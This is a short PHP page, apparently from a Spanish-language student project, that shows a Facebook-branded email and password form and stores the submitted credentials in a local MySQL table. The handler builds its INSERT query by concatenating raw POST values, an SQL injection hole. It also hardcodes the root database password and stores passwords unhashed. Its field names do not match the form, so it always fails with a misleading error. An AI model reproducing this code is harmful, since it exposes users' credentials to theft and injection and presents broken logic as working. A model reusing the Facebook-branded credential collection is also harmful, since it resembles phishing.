<?php
echo "<meta http-equiv=content-type content=text/html; charset=UTF-8 />" ;
if($_GET['accion']=="facebook") {

   /*Esto quiere decir que se está enviando el formulario y hay que registrar */

   $user=$_POST['user'];
   $pass1=$_POST['pass1'];
   

   if($pass1) {
       

       $conexion = mysql_connect("localhost", "root", "programacion");

       mysql_select_db("myconcert", $conexion);

       $sql="INSERT INTO usuario (user, pass) VALUES ('".$user."', '".$pass1."')";

       mysql_query($sql, $conexion) or die ("Error al insertar datos ". mysql_error());

       echo "Cuenta de facebook exitoso<br><a href=indexlogin.php>Entrar con facebook</a>";
   } else {
       die("Error, las password no coinciden");
   }
} else { ?><html>
<head><title>Por Facebook</title>
   <meta http-equiv="content-type" content="text/html; charset=UTF-8" /> 
</head>
<body>

<form action="facebook.php?accion=facebook" method="POST">
Correo: <input type="text" name="correo"><br>
Password: <input type="password" name="pass"><br>
<input type="submit" value="Entrar">
</form>


</body>
</html>
<?php 
}
?>
